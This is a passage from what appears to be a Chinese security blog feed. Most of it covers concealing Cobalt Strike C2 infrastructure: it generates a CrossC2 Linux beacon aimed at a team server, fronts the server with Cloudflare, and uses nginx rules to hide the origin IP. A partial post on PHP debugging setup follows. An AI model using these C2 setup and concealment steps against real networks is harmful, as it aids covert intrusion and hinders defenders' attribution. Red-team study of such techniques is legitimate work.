operator">.</span><span class="token operator">/</span>cobaltstrike<span class="token operator">.</span>jar c2profile<span class="token operator">.</span>Lint init<span class="token operator">.</span>profile</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用profile:</p><pre class="line-numbers language-lsl"><code class="language-lsl">cmd /k teamserver_win.bat 192.168.11.1 123456 init.profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后在Ubuntu上生成二进制文件：</p><pre class="line-numbers language-stylus"><code class="language-stylus"><span class="token property-declaration"><span class="token property">gcc</span> init<span class="token operator">.</span>c -fPIC -shared -o init<span class="token operator">.</span>so</span><span class="token punctuation">.</span>/genCrossC2<span class="token punctuation">.</span>Linux41 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>11<span class="token punctuation">.</span>1 8086 <span class="token punctuation">.</span>cobaltstrike<span class="token punctuation">.</span>beacon_keys init<span class="token punctuation">.</span>so Linux x64 <span class="token punctuation">.</span>/shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/08/02/wkGnHh1BlFStJub.png"><br>然后执行<code>./shell</code>,成功的返回了beacon:<br><img src="https://i.loli.net/2021/08/02/x81X4CEf3y6uNrg.png"></p><p>2.使用<a href="https://github.com/Richard-Tang/CrossC2-C2Profile">CrossC2-C2Profile</a><br>在github上看到Richard-Tang师傅实现了jquery-c2.4.0.profile的兼容，进行了测试使用(profile日期报错的时候cs启动参数加上 <code>-Duser.language=en</code> )：<br><img src="https://i.loli.net/2021/08/02/rSohkVPEYxjXKBn.png"></p><p>3.Linux在CDN中上线<br>在CrossC2_v2.24中不使用cdn，使用域名可以正常上线；使用cdn后web无日志，无上线；在v2.2.5中使用域名正常上线，但是心跳不稳定，一会就超时了。<br><img src="https://i.loli.net/2021/08/11/t2E8FbaAjlRsYNH.png"></p><h2 id="0x04-CDN后获取真实源IP"><a href="#0x04-CDN后获取真实源IP" class="headerlink" title="0x04 CDN后获取真实源IP"></a>0x04 CDN后获取真实源IP</h2><p>1.Cloudflare请求会自带X-Forwarded-For头，在nginx中设置一下X-Forwarded-For标头(不设置容易获取到127.0.0.1)，CobaltStrike需要在profile中开启 X-Forwarded-For 获取，<br>nginx.conf:</p><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token keyword">server</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">proxy_set_header</span> X<span class="token operator">-</span>Forwarded<span class="token operator">-</span>For <span class="token variable">$proxy_add_x_forwarded_for</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">#代理到cs</span>        <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">60100</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>profile设置：</p><pre class="line-numbers language-profile"><code class="language-profile">http-config {set trust_x_forwarded_for "true";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Cloudflare还可以使用标头CF-Connecting-IP来获取真实IP，使用需要开启标头下划线支持，不然不能用这个参数，一般来说使用这个参数获取的比较准确:</p><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token keyword">server</span> <span class="token punctuation">{</span>        <span class="token keyword">listen</span> <span class="token number">80</span><span class="token punctuation">;</span>        <span class="token keyword">server_name</span>  _<span class="token punctuation">;</span>        <span class="token keyword">access_log</span>  logs<span class="token operator">/</span>cname<span class="token punctuation">.</span>log  main<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">#开启请求中的下划线支持，方便使用自定义的header头</span>        <span class="token keyword">underscores_in_headers</span> on<span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">#把CF-Connecting-IP请求头设置为X-Forwarded-For</span>        <span class="token keyword">proxy_set_header</span> X<span class="token operator">-</span>Forwarded<span class="token operator">-</span>For <span class="token variable">$http_cf_connecting_ip</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">#代理到cs</span>        <span class="token keyword">proxy_pass</span> <span class="token keyword">http</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">:</span><span class="token number">60100</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.在nginx中<code>$remote_addr</code>用来存请求的真实来源IP，一般CDN回源时都会有请求头来记录客户端真实IP(像cf用的上面说的两个，阿里CDN用的Ali-CDN-Real-IP)，nginx记录来源IP的参数是<code>$remote_addr</code>，可以用来在日志中记录IP，使用real_ip_header来设置，比如在Cloudflare中设置<code>$remote_addr</code>真实来源，在server段中配置日志保存格式和路径，可以很方便的对日志进行分别管理查看：</p><pre class="line-numbers language-nginx"><code class="language-nginx"> <span class="token keyword">log_format</span>  main  <span class="token string">'$remote_addr - $remote_user [$time_local] "$request" '</span>                      <span class="token string">'$status $body_bytes_sent "$http_referer" '</span>                      <span class="token string">'"$http_user_agent" "$http_x_forwarded_for"'</span><span class="token punctuation">;</span> <span class="token keyword">server</span> <span class="token punctuation">{</span>         <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">server_name</span> www<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>com<span class="token punctuation">;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token comment" spellcheck="true">#CDN回源IP段</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">103.21</span><span class="token punctuation">.</span><span class="token number">244.0</span><span class="token operator">/</span><span class="token number">22</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">103.22</span><span class="token punctuation">.</span><span class="token number">200.0</span><span class="token operator">/</span><span class="token number">22</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">103.31</span><span class="token punctuation">.</span><span class="token number">4.0</span><span class="token operator">/</span><span class="token number">22</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">104.16</span><span class="token punctuation">.</span><span class="token number">0.0</span><span class="token operator">/</span><span class="token number">12</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">108.162</span><span class="token punctuation">.</span><span class="token number">192.0</span><span class="token operator">/</span><span class="token number">18</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">131.0</span><span class="token punctuation">.</span><span class="token number">72.0</span><span class="token operator">/</span><span class="token number">22</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">141.101</span><span class="token punctuation">.</span><span class="token number">64.0</span><span class="token operator">/</span><span class="token number">18</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">162.158</span><span class="token punctuation">.</span><span class="token number">0.0</span><span class="token operator">/</span><span class="token number">15</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">172.64</span><span class="token punctuation">.</span><span class="token number">0.0</span><span class="token operator">/</span><span class="token number">13</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">173.245</span><span class="token punctuation">.</span><span class="token number">48.0</span><span class="token operator">/</span><span class="token number">20</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">188.114</span><span class="token punctuation">.</span><span class="token number">96.0</span><span class="token operator">/</span><span class="token number">20</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">190.93</span><span class="token punctuation">.</span><span class="token number">240.0</span><span class="token operator">/</span><span class="token number">20</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">197.234</span><span class="token punctuation">.</span><span class="token number">240.0</span><span class="token operator">/</span><span class="token number">22</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">198.41</span><span class="token punctuation">.</span><span class="token number">128.0</span><span class="token operator">/</span><span class="token number">17</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">2400</span><span class="token punctuation">:</span>cb00<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token number">32</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">2606</span><span class="token punctuation">:</span><span class="token number">4700</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token number">32</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">2803</span><span class="token punctuation">:</span>f800<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token number">32</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">2405</span><span class="token punctuation">:</span>b500<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token number">32</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">2405</span><span class="token punctuation">:</span><span class="token number">8100</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token number">32</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> 2c0f<span class="token punctuation">:</span>f248<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token number">32</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> 2a06<span class="token punctuation">:</span>98c0<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">/</span><span class="token number">29</span><span class="token punctuation">;</span>        <span class="token keyword">set_real_ip_from</span> <span class="token number">127.0</span><span class="token punctuation">.</span><span class="token number">0.1</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">#从请求头中获取IP</span>        <span class="token keyword">real_ip_header</span> CF<span class="token operator">-</span>Connecting<span class="token operator">-</span>IP<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">#将CF-Connecting-IP里不在set_real_ip_from中的IP当做真实IP</span>        real_ip_recursive on<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">#使用$remote_addr</span>        <span class="token keyword">proxy_set_header</span> X<span class="token operator">-</span>Forwarded<span class="token operator">-</span>For <span class="token variable">$remote_addr</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">#日志记录</span>        <span class="token keyword">access_log</span>  logs<span class="token operator">/</span>www<span class="token punctuation">.</span>xx<span class="token punctuation">.</span>com<span class="token punctuation">.</span>log  main<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里要注意一下，如果网站使用了HTTPS，默认情况下CDN会将http重写为https,存在原来80端口的服务访问不了的情况，可以在cdn中关闭自动重写：<br><img src="https://i.loli.net/2021/08/10/hVaCODR4tbjI9zw.png"></p><h2 id="0x05-Nginx中server-name的配置"><a href="#0x05-Nginx中server-name的配置" class="headerlink" title="0x05 Nginx中server_name的配置"></a>0x05 Nginx中server_name的配置</h2><p>nginx中使用server_name定义虚拟主机名，设置server_name指定要处理的域名：</p><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token keyword">server</span> <span class="token punctuation">{</span>    <span class="token keyword">listen</span> <span class="token number">80</span><span class="token punctuation">;</span>    <span class="token keyword">server_name</span> www<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com<span class="token punctuation">;</span>    <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">200</span> <span class="token string">'baidu found!'</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">server</span> <span class="token punctuation">{</span>    <span class="token keyword">listen</span> <span class="token number">80</span><span class="token punctuation">;</span>    <span class="token keyword">server_name</span> www<span class="token punctuation">.</span>qq<span class="token punctuation">.</span>com<span class="token punctuation">;</span>    <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">200</span> <span class="token string">'qq found!'</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/07/21/R6nbVug1tOWhXca.png"></p><p>其他的默认情况：</p><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token keyword">server</span> <span class="token punctuation">{</span><span class="token keyword">listen</span> <span class="token number">80</span><span class="token punctuation">;</span><span class="token keyword">server_name</span> _<span class="token punctuation">;</span><span class="token comment" spellcheck="true">#可以对host进行一些判断</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$host</span> <span class="token operator">!=</span> <span class="token string">"www.qq.com"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">501</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">200</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>｝<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/07/21/NKA53bUMi1GjelI.png"></p><p><img src="https://i.loli.net/2021/07/21/SpfTPxj4sc68AVU.png"></p><h2 id="0x06-Nginx使用WAF"><a href="#0x06-Nginx使用WAF" class="headerlink" title="0x06 Nginx使用WAF"></a>0x06 Nginx使用WAF</h2><p>使用waf可以防御一些恶意扫描，这里使用了<a href="http://openresty.org/cn/">openresty</a>来使用lua的<a href="https://github.com/unixhot/waf">waf</a>，将waf代码放到lua/waf下，然后在nginx配置文件http段中添加引入即可：<br><img src="https://i.loli.net/2021/08/03/oNHk7TExQghsIAJ.png"></p><pre class="line-numbers language-nginx"><code class="language-nginx">    <span class="token comment" spellcheck="true"># WAF</span>    lua_shared_dict limit 50m<span class="token punctuation">;</span>    lua_package_path <span class="token string">"./lua\waf/?.lua;;"</span><span class="token punctuation">;</span>    init_by_lua_file <span class="token string">"./lua/waf/init.lua"</span><span class="token punctuation">;</span>    access_by_lua_file <span class="token string">"./lua/waf/access.lua"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以在config.lua中进行详细的配置:<br><img src="https://i.loli.net/2021/08/03/ovENWjJAMLgFTy3.png"><br>触发规则会进行拦截:<br><img src="https://i.loli.net/2021/08/03/XNhlgasn3ecwYbZ.png"><br>各种规则可以在rule-config中详细配置。</p><h2 id="0x07-针对来源IP限制返回内容"><a href="#0x07-针对来源IP限制返回内容" class="headerlink" title="0x07 针对来源IP限制返回内容"></a>0x07 针对来源IP限制返回内容</h2><p>有时候请求不是走正常路径过来的，可以设置nginx只对CDN来源IP开放访问，其他地址拒绝(这个会和获取真实IP那个冲突，获取真实IP可以写在location块里，就不要写在server里了)：</p><pre class="line-numbers language-nginx"><code class="language-nginx"><span class="token keyword">http</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">#通过if判断值，如果是是CDN的IP，$allow_ip = 0,否则就是default 1。</span>    <span class="token keyword">geo</span> <span class="token variable">$allow_ip</span> <span class="token punctuation">{</span>        default             <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token number">173.245</span><span class="token punctuation">.</span><span class="token number">48.0</span><span class="token operator">/</span><span class="token number">20</span>    <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">103.21</span><span class="token punctuation">.</span><span class="token number">244.0</span><span class="token operator">/</span><span class="token number">22</span>    <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">103.22</span><span class="token punctuation">.</span><span class="token number">200.0</span><span class="token operator">/</span><span class="token number">22</span>    <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">103.31</span><span class="token punctuation">.</span><span class="token number">4.0</span><span class="token operator">/</span><span class="token number">22</span>     <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">141.101</span><span class="token punctuation">.</span><span class="token number">64.0</span><span class="token operator">/</span><span class="token number">18</span>    <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">108.162</span><span class="token punctuation">.</span><span class="token number">192.0</span><span class="token operator">/</span><span class="token number">18</span>   <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">190.93</span><span class="token punctuation">.</span><span class="token number">240.0</span><span class="token operator">/</span><span class="token number">20</span>    <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">188.114</span><span class="token punctuation">.</span><span class="token number">96.0</span><span class="token operator">/</span><span class="token number">20</span>    <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">197.234</span><span class="token punctuation">.</span><span class="token number">240.0</span><span class="token operator">/</span><span class="token number">22</span>   <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">198.41</span><span class="token punctuation">.</span><span class="token number">128.0</span><span class="token operator">/</span><span class="token number">17</span>    <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">162.158</span><span class="token punctuation">.</span><span class="token number">0.0</span><span class="token operator">/</span><span class="token number">15</span>     <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">104.16</span><span class="token punctuation">.</span><span class="token number">0.0</span><span class="token operator">/</span><span class="token number">12</span>      <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">172.64</span><span class="token punctuation">.</span><span class="token number">0.0</span><span class="token operator">/</span><span class="token number">13</span>      <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token number">131.0</span><span class="token punctuation">.</span><span class="token number">72.0</span><span class="token operator">/</span><span class="token number">22</span>      <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">server</span>  <span class="token punctuation">{</span>        <span class="token keyword">listen</span> <span class="token number">80</span> default<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">#任意host</span>        <span class="token keyword">server_name</span> _<span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">#以http对IP的访问，不是来自允许的源不提供服务，返回301。</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$allow_ip</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token number">301</span><span class="token punctuation">;</span><span class="token punctuation">}</span>         <span class="token keyword">location</span> <span class="token operator">/</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true"># 返回内容</span>                <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x08-防止HTTPS访问IP泄露证书"><a href="#0x08-防止HTTPS访问IP泄露证书" class="headerlink" title="0x08 防止HTTPS访问IP泄露证书"></a>0x08 防止HTTPS访问IP泄露证书</h2><p>有时候会发现我们VPS的真实IP泄露了，在nginx配置不当时，就可以通过证书泄露IP，通过fofa看到在该IP上的证书：<br><img src="https://i.loli.net/2021/07/21/a4t9ZCTqcAwO3rK.png"><br>如果要防止nginx泄露IP，不能通过下列检查host来防御，依然会返回证书：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$host</span> <span class="token operator">!=</span> <span class="token string">"www.qq.com"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> 400<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>一、可以给IP配置一个自签名的证书，通过https访问IP时返回的就是这个自签名的证书<br>1.免费证书获取可以在csr.chinassl.net和Let’s Encrypt获取，以csr.chinassl.net为例：<br><img src="https://i.loli.net/2021/07/21/pEJN2s3IwTVPCB8.png"><br>然后下载得到CSR文件和KEY文件，然后上传CSR生成证书即可：<br><img src="https://i.loli.net/2021/07/21/eg9ADmYodHzXkOt.png"><br>获取后会得到.crt文件，在nginx中配置即可。</p><p>当然了,还可以使用使用openssl（windows下载:<a href="https://slproweb.com/products/Win32OpenSSL.html%EF%BC%89%E5%91%BD%E4%BB%A4%E7%94%9F%E6%88%90%E8%87%AA%E7%AD%BE%E5%90%8D%E7%9A%84%E8%AF%81%E4%B9%A6%EF%BC%9A">https://slproweb.com/products/Win32OpenSSL.html）命令生成自签名的证书：</a></p><pre class="line-numbers language-cmd"><code class="language-cmd">openssl req -x509 -nodes -days 3650 -newkey rsa:2048 -keyout ssl.key -out https.crt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.nginx配置<br>server_name配置成任意，作为默认配置，没有匹配到server_name时就返回此处配置内容：</p><pre class="line-numbers language-groovy"><code class="language-groovy">server <span class="token punctuation">{</span>    listen <span class="token number">443</span> ssl<span class="token punctuation">;</span>    server_name <span class="token number">_</span><span class="token punctuation">;</span>    ssl_certificate  key<span class="token operator">/</span>xxx<span class="token operator">.</span>com_ssl<span class="token operator">.</span>crt<span class="token punctuation">;</span>    ssl_certificate_key key<span class="token operator">/</span>xxx<span class="token operator">.</span>com_key<span class="token punctuation">;</span>    ssl_session_timeout 5m<span class="token punctuation">;</span>    ssl_ciphers TLS13<span class="token operator">-</span>AES<span class="token operator">-</span><span class="token number">256</span><span class="token operator">-</span>GCM<span class="token operator">-</span>SHA384<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>CHACHA20<span class="token operator">-</span>POLY1305<span class="token operator">-</span>SHA256<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>AES<span class="token operator">-</span><span class="token number">128</span><span class="token operator">-</span>GCM<span class="token operator">-</span>SHA256<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>AES<span class="token operator">-</span><span class="token number">128</span><span class="token operator">-</span>CCM<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>SHA256<span class="token punctuation">:</span>TLS13<span class="token operator">-</span>AES<span class="token operator">-</span><span class="token number">128</span><span class="token operator">-</span>CCM<span class="token operator">-</span>SHA256<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>CHACHA20<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>AES128<span class="token punctuation">:</span>RSA<span class="token operator">+</span>AES128<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>AES256<span class="token punctuation">:</span>RSA<span class="token operator">+</span>AES256<span class="token punctuation">:</span>EECDH<span class="token operator">+</span>3DES<span class="token punctuation">:</span>RSA<span class="token operator">+</span>3DES<span class="token punctuation">:</span><span class="token operator">!</span>MD5<span class="token punctuation">;</span>        ssl_protocols TLSv1<span class="token operator">.</span><span class="token number">1</span> TLSv1<span class="token operator">.</span><span class="token number">2</span> TLSv1<span class="token operator">.</span><span class="token number">3</span><span class="token punctuation">;</span>    ssl_prefer_server_ciphers on<span class="token punctuation">;</span>    location <span class="token operator">/</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样一来访问IP就使用这个自签名的证书，访问域名就使用域名的证书，不会造成IP和域名关联。<br>二、不配置证书，使用CDN灵活模式<br>灵活模式是指客户端与CDN进行HTTPS通信，CDN与服务器HTTP通信，这样证书来源直接就是CDN的，nginx只需要在80端口配置即可：<br><img src="https://i.loli.net/2021/07/30/84bqCA6IvBWeOZY.png" alt="灵活模式"><br>边缘证书中设置始终使用HTTPS:<br><img src="https://i.loli.net/2021/07/30/8dlsYFL6ctDTxu4.png"><br>访问网站，查看证书：<br><img src="https://i.loli.net/2021/07/21/bJRVhYvtU1cqyB2.png"><br>这种方式确实灵活,不用配证书,可以将http的访问自动重写为https。还可以在边缘证书中设置一个随机加密(HTTP/2)，访问的时候是http,但是会使用加密：<br><img src="https://i.loli.net/2021/08/19/Ud7rW9RYjEJMDan.png"></p><h2 id="0x09-参考链接"><a href="#0x09-参考链接" class="headerlink" title="0x09 参考链接"></a>0x09 参考链接</h2><p><a href="https://github.com/unixhot/waf">https://github.com/unixhot/waf</a></p><p><a href="https://www.cnblogs.com/Xy--1/p/14396744.html">https://www.cnblogs.com/Xy--1/p/14396744.html</a></p><p><a href="https://support.cloudflare.com/hc/zh-cn/articles/200170786-%E6%81%A2%E5%A4%8D%E5%8E%9F%E5%A7%8B%E8%AE%BF%E9%97%AE%E8%80%85-IP-%E4%BD%BF%E7%94%A8-mod-cloudflare-%E8%AE%B0%E5%BD%95%E8%AE%BF%E9%97%AE%E8%80%85-IP-%E5%9C%B0%E5%9D%80-">https://support.cloudflare.com/hc/zh-cn/articles/200170786-%E6%81%A2%E5%A4%8D%E5%8E%9F%E5%A7%8B%E8%AE%BF%E9%97%AE%E8%80%85-IP-%E4%BD%BF%E7%94%A8-mod-cloudflare-%E8%AE%B0%E5%BD%95%E8%AE%BF%E9%97%AE%E8%80%85-IP-%E5%9C%B0%E5%9D%80-</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobaltStrike </tag>
            
            <tag> 流量伪装 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPStorm+PHPStudy调试配置</title>
      <link href="/2021/07/27/phpstudy-phpstorm-de-dai-ma-diao-shi-pei-zhi/"/>
      <url>/2021/07/27/phpstudy-phpstorm-de-dai-ma-diao-shi-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-简述"><a href="#0x01-简述" class="headerlink" title="0x01 简述"></a>0x01 简述</h2><p>记录代码审计基础中调试环境的配置，主要使用PHPStudy作为服务器，PHPStorm作为开发调试工具，并配置远程调试和本地调试两种方案。远程调试的优点是不需要本地有PHP环境，缺点是需要修改文件时要同步文件修改到远程；本地调试比较方便快捷一些，但是有时候会遇到BlueTeam代码投毒，审计调试的时候主机被控制。这里对两种调试配置方法进行记录。</p><h2 id="0x02-远程调试配置"><a href="#0x02-远程调试配置" class="headerlink" title="0x02 远程调试配置"></a>0x02 远程调试配置</h2><p>使用PHPStudy + PHPStorm远程调试，不用在本地安装PHP环境，不用web服务器，代码执行都交给远程服务器，配置下列项目即可：<br>远程服务器，PHPSdtudy配置:</p><ol><li>开启FTP服务，目录设置为Web目录，用来同步PHPStorm对文件的修改</li><li>php配置开启Xdebug插件</li></ol><p>本地PHPStorm配置</p><ol><li>PHP远程调试</li><li>PHP Web页面</li></ol><h3 id="PHPSdtudy开启FTP"><a href="#PHPSdtudy开启FTP" class="headerlink" title="PHPSdtudy开启FTP"></a>PHPSdtudy开启FTP</h3><p>在FTP选项里配置好用户名和密码，根目录设置为WEB目录<br><img src="https://i.loli.net/2021/07/27/CLW2Zt856zkRpbH.png"></p><h3 id="PHP开启Xdebug"><a href="#PHP开启Xdebug" class="headerlink" title="PHP开启Xdebug"></a>PHP开启Xdebug</h3><p>在Phpstudy菜单软件管理-PHP-设置-扩展组件-Xdebug中设置，选择启用即可:<br><img src="https://i.loli.net/2021/07/27/Wd2yxL3AQvpH7lO.png"><br>查看配置文件：<br><img src="https://i.loli.net/2021/07/27/SnpyvB6g4Xj5rZU.png"><br>在WEB下新建个index.php，写入<code>&lt;?php phpinfo();?&gt;</code>,然后访问发现Xdebug已启用：<br><img src="https://i.loli.net/2021/07/27/TpH2PtfvSkUnl8o.png"><br>接下来把远程调试开启，需要PHPStorm主机的IP地址(我这里是192.168.200.32)，并开启远程调试：<br><img src="https://i.loli.net/2021/07/27/GQYDx2uEXKjt8hl.png"><br>然后重启nginx服务器，接下来就可以配置PHPStorm了。</p><h3 id="PHPStorm远程调试配置"><a href="#PHPStorm远程调试配置" class="headerlink" title="PHPStorm远程调试配置"></a>PHPStorm远程调试配置</h3><p>远程配置涉及到到代码文件的同步，Web页面的显示，远程调试接口的配置。<br><strong>PHP远程调试</strong><br>首先配置远程调试，这里配置其一是服务器Xdeug扩展，二是本地的文件怎么同步到远程。因为本地在文件中添加了语句，需要同步到远程服务器执行才能看到效果，在菜单:运行-编辑配置-PHP远程调试中:<br><img 